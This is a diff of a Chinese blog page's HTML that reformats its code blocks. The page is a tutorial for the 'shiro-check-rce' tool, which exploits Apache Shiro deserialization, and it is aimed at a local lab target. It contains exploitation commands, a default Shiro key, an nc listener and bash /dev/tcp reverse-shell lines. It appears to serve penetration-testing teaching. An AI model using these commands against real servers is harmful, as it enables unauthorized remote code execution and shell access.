@@ -426,14 +426,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    944
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    4 分
                 </div>
                 
 
@@ -452,37 +452,54 @@
 <a id="more"></a>
 
 <h1 id="0x01-工具安装"><a href="#0x01-工具安装" class="headerlink" title="0x01 工具安装"></a>0x01 工具安装</h1><p>本工具需要 Python3 和 Java 环境，下载本工具后，将文件解压，在本项目目录下运行下面的命令，安装Python第三方库即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
+<pre><code>pip3 install -r requirements.txt</code></pre>
 <p>国外下载地址：<a target="_blank" rel="noopener" href="https://github.com/teamssix/shiro-check-rce/releases/">https://github.com/teamssix/shiro-check-rce/releases/</a></p>
 <p>国内下载地址：<a target="_blank" rel="noopener" href="https://gitee.com/teamssix/shiro-check-rce/releases">https://gitee.com/teamssix/shiro-check-rce/releases</a></p>
-<h1 id="0x02-工具介绍"><a href="#0x02-工具介绍" class="headerlink" title="0x02 工具介绍"></a>0x02 工具介绍</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   _____ __    _               ________              __      ____  ____________</span><br><span class="line">  &#x2F; ___&#x2F;&#x2F; &#x2F;_  (_)________     &#x2F; ____&#x2F; &#x2F;_  ___  _____&#x2F; &#x2F;__   &#x2F; __ \&#x2F; ____&#x2F; ____&#x2F;</span><br><span class="line">  \__ \&#x2F; __ \&#x2F; &#x2F; ___&#x2F; __ \   &#x2F; &#x2F;   &#x2F; __ \&#x2F; _ \&#x2F; ___&#x2F; &#x2F;&#x2F;_&#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;   &#x2F; __&#x2F;   </span><br><span class="line"> ___&#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F;  &#x2F; &#x2F;___&#x2F; &#x2F; &#x2F; &#x2F;  __&#x2F; &#x2F;__&#x2F; ,&lt;    &#x2F; _, _&#x2F; &#x2F;___&#x2F; &#x2F;___   </span><br><span class="line">&#x2F;____&#x2F;_&#x2F; &#x2F;_&#x2F;_&#x2F;_&#x2F;   \____&#x2F;   \____&#x2F;_&#x2F; &#x2F;_&#x2F;\___&#x2F;\___&#x2F;_&#x2F;|_|  &#x2F;_&#x2F; |_|\____&#x2F;_____&#x2F;   By TeamsSix</span><br><span class="line"></span><br><span class="line">我的个人博客：teamssix.com</span><br><span class="line">我的个人公众号：TeamsSix</span><br><span class="line"></span><br><span class="line">-c ：输入要执行的命令</span><br><span class="line">-h ：查看帮助</span><br><span class="line">-k : 输入自定义的key，不输入此参数时将遍历尝试默认key</span><br><span class="line">-t ：输入你的ceye.io的token，用于检测shiro漏洞是否存在，此选项需要配合 -c &quot;ping your.ceye.io&quot; 使用</span><br><span class="line">-u ：指定URL</span><br><span class="line"></span><br><span class="line">python3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;token&gt; (-u) &lt;url&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-工具介绍"><a href="#0x02-工具介绍" class="headerlink" title="0x02 工具介绍"></a>0x02 工具介绍</h1><pre><code>   _____ __    _               ________              __      ____  ____________
+  / ___// /_  (_)________     / ____/ /_  ___  _____/ /__   / __ \/ ____/ ____/
+  \__ \/ __ \/ / ___/ __ \   / /   / __ \/ _ \/ ___/ //_/  / /_/ / /   / __/   
+ ___/ / / / / / /  / /_/ /  / /___/ / / /  __/ /__/ ,&lt;    / _, _/ /___/ /___   
+/____/_/ /_/_/_/   \____/   \____/_/ /_/\___/\___/_/|_|  /_/ |_|\____/_____/   By TeamsSix
 
+我的个人博客：teamssix.com
+我的个人公众号：TeamsSix
+
+-c ：输入要执行的命令
+-h ：查看帮助
+-k : 输入自定义的key，不输入此参数时将遍历尝试默认key
+-t ：输入你的ceye.io的token，用于检测shiro漏洞是否存在，此选项需要配合 -c &quot;ping your.ceye.io&quot; 使用
+-u ：指定URL
+
+python3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;token&gt; (-u) &lt;url&gt;</code></pre>
 <h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>该功能需要你有一个<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a>的账号，在<a target="_blank" rel="noopener" href="http://ceye.io/profile">http://ceye.io/profile</a>页面，找到自己的<code>Identifier</code>值和<code>API Token</code>值。</p>
 <p>使用 -t 和 -c 参数配合使用，即可调用默认key字典进行检测。</p>
 <blockquote>
 <p>文中的 <a target="_blank" rel="noopener" href="http://192.168.175.146:8080/">http://192.168.175.146:8080/</a> 为本地靶机，192.168.175.152:9527 为 nc 监听地址。</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125;</span><br><span class="line"></span><br><span class="line">示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6</span><br></pre></td></tr></table></figure>
+<pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125;
 
+示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-21-10.png"></p>
 <p>如果你有自己的key，也可以使用 -k 参数进行指定。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125; -k &#123;key&#125;</span><br><span class="line"></span><br><span class="line">示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6 -k kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125; -k &#123;key&#125;
 
+示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6 -k kPH+bIxk5D2deZiIxcaaaA==</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-27-47.png"></p>
 <h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>这里我采用bash命令反弹到本地nc监听端口的方式，因此我这里需要先在本地建立一个 nc 监听端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9527</span><br></pre></td></tr></table></figure>
-
+<pre><code>nc -lvvp 9527</code></pre>
 <p>之后，执行反弹shell命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">示例：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre><code>bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1
 
+示例：bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1</code></pre>
 <p>本工具会对输入命令进行识别，如果检测到用户输入了bash反弹shell命令，将会自动对命令进行编码，无需自己编码，避免了明明存在漏洞却因为编码问题而反弹不了shell的尴尬。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot;
 
+示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot;</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell.gif"></p>
 <p>如果知道key的话，就直接 -k 指定 key 即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#123;your_nc_ip&#125;&#x2F;&#123;your_nc_port&#125; 0&gt;&amp;1&quot; -k &#123;key&#125;</span><br><span class="line"></span><br><span class="line">示例：python3 shiro-check-rce.py -u http:&#x2F;&#x2F;192.168.175.146:8080&#x2F; -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.175.152&#x2F;9527 0&gt;&amp;1&quot; -k kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot; -k &#123;key&#125;
 
+示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot; -k kPH+bIxk5D2deZiIxcaaaA==</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell_key.gif"></p>
 <h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul>
 <li>本程序需要 python3 环境以及 java环境</li>
@@ -924,7 +941,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
